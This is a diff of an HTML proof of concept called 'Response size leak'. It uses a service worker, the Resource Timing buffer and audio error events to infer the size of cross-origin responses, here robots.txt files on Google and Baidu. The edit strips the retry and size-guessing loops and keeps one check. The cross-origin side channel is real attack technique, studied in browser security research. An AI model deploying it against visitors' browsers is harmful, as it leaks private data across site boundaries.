@@ -3,6 +3,7 @@
 	<head>
 		<title>Response size leak</title>
 		<script>
+
 			if ("serviceWorker" in navigator) {
 				addEventListener("load", async () => {
 					performance.setResourceTimingBufferSize(1337);
@@ -12,51 +13,22 @@
 				});
 			}
 
-			singleSizeCheck =  async (url, size) => {
-				let start   = performance.getEntries().length;
-				let sound   = document.createElement("audio");
+			singleSizeCheck = async (url, size) => {
+				let start = performance.getEntries().length;
+				let sound = document.createElement("audio");
 				sound.src = `${url}?size=${size}&${Math.random()}`;
 				return new Promise((resolve) => {
 					sound.onerror = () => {
 						let end = performance.getEntries().length;
-						if (end - start == 2)
-							return resolve(true);
-						else
-							return resolve(false);
+						return resolve(end - start);
 					}
 				});
-			}
-
-			sizeCheck = async (url, size) => {
-				let tries = 10;
-				return new Promise(async (resolve) => {
-					while (tries) {
-						let status = await singleSizeCheck(url, size);
-						if (status)
-							return resolve(true);
-						tries--;
-					}
-					return resolve(false);
-				});
-			}
-
-			sizeLoop = async (url, sizeGuess) => {
-				let size = await sizeCheck(url, sizeGuess)
-				if (size) {
-					writeResult(url, sizeGuess, "more than ", "red");
-					sizeLoop(url, ++sizeGuess);
-				} else {
-					writeResult(url, sizeGuess, "", "red");
-				}
-			}
-
-			writeResult = async (url, size, message, status) => {
-				document.body.innerHTML += `<h3><font color="${status}">Response for <b><i>${url}</i></b> has ${message}<b>${size}</b> bytes.</font></h3>`;
 			}
 			
 			onload = () => {
-				sizeLoop("https://www.google.com/robots.txt", 7240);
+				singleSizeCheck("https://www.baidu.com/robots.txt", 7240);
 			}
+
     </script>
   </head>
 
